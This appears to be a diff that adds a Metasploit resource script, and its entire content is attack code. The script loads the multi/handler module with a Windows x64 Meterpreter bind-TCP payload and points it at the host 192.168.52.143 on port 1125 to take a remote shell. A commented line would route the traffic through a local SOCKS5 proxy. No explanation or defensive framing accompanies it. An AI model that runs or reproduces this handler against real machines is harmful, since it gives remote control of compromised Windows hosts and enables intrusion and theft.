@@ -1,0 +1,6 @@
+# setg Proxies socks5:127.0.0.1:1080
+use exploit/multi/handler 
+set payload windows/x64/meterpreter/bind_tcp
+set rhost 192.168.52.143
+set lport 1125
+run
